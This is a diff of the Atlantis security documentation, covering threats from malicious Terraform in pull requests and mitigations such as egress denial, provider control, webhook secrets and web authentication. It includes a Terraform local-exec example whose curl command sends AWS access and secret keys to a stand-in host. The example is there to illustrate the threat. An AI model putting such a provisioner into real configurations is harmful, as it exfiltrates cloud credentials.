@@ -4,15 +4,18 @@
 Because you usually run Atlantis on a server with credentials that allow access to your infrastructure it's important that you deploy Atlantis securely.
 
 Atlantis could be exploited by
+* An attacker submitting a pull request that contains a malicious Terraform file that
+  uses a malicious provider or an [`external` data source](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data_source)
+  that Atlantis then runs `terraform plan` on (which it does automatically unless you've turned off automatic plans).
 * Running `terraform apply` on a malicious Terraform file with [local-exec](https://www.terraform.io/docs/provisioners/local-exec.html)
-```tf
-resource "null_resource" "null" {
-  provisioner "local-exec" {
-    command = "curl https://cred-stealer.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
-  }
-}
-```
-* Running malicious hook commands specified in an `atlantis.yaml` file.
+    ```tf
+    resource "null_resource" "null" {
+      provisioner "local-exec" {
+        command = "curl https://cred-stealer.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
+      }
+    }
+    ```
+* Running malicious custom build commands specified in an `atlantis.yaml` file. Atlantis uses the `atlantis.yaml` file from the pull request branch, **not** `master`.
 * Someone adding `atlantis plan/apply` comments on your valid pull requests causing terraform to run when you don't want it to.
 
 ## Bitbucket Cloud (bitbucket.org)
@@ -31,7 +34,7 @@ To prevent this, allowlist [Bitbucket's IP addresses](https://confluence.atlassi
 
 ## Mitigations
 ### Don't Use On Public Repos
-Because anyone can comment on public pull requests, even with all the security mitigations available, it's still dangerous to run Atlantis on public repos until Atlantis gets an authentication system.
+Because anyone can comment on public pull requests, even with all the security mitigations available, it's still dangerous to run Atlantis on public repos without proper configuration of the security settings.
 
 ### Don't Use `--allow-fork-prs`
 If you're running on a public repo (which isn't recommended, see above) you shouldn't set `--allow-fork-prs` (defaults to false)
@@ -46,6 +49,19 @@ For example:
 * All repositories: `--repo-allowlist=*`. Useful for when you're in a protected network but dangerous without also setting a webhook secret.
 
 This flag ensures your Atlantis install isn't being used with repositories you don't control. See `atlantis server --help` for more details.
+
+### Protect Terraform Planning
+If attackers submitting pull requests with malicious Terraform code is in your threat model
+then you must be aware that `terraform apply` approvals are not enough. It is possible
+to run malicious code in a `terraform plan` using the [`external` data source](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data_source)
+or by specifying a malicious provider. This code could then exfiltrate your credentials.
+
+To prevent this, you could:
+1. Bake providers into the Atlantis image or host and deny egress in production.
+1. Implement the provider registry protocol internally and deny public egress, that way you control who has write access to the registry.
+1. Modify your [server-side repo configuration](https://www.runatlantis.io/docs/server-side-repo-config.html)'s `plan` step to validate against the
+   use of disallowed providers or data sources or PRs from not allowed users. You could also add in extra validation at this point, e.g.
+   requiring a "thumbs-up" on the PR before allowing the `plan` to continue. Conftest could be of use here.
 
 ### Webhook Secrets
 Atlantis should be run with Webhook secrets set via the `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` environment variables.
@@ -63,3 +79,12 @@ Azure DevOps supports sending a basic authentication header in all webhook event
 If you're using webhook secrets but your traffic is over HTTP then the webhook secrets
 could be stolen. Enable SSL/HTTPS using the `--ssl-cert-file` and `--ssl-key-file`
 flags.
+
+### Enable Authentication on Atlantis Web Server
+It is very recommended to enable authentication in the web service. Enable BasicAuth using the `--web-basic-auth=true` and setup a username and a password using `--web-username=yourUsername` and `--web-password=yourPassword` flags.
+
+You can also pass these as environment variables `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=yourUsername` and `ATLANTIS_WEB_PASSWORD=yourPassword`. 
+
+:::tip Tip
+We do encourage the usage of complex passwords in order to prevent basic bruteforcing attacks.
+:::
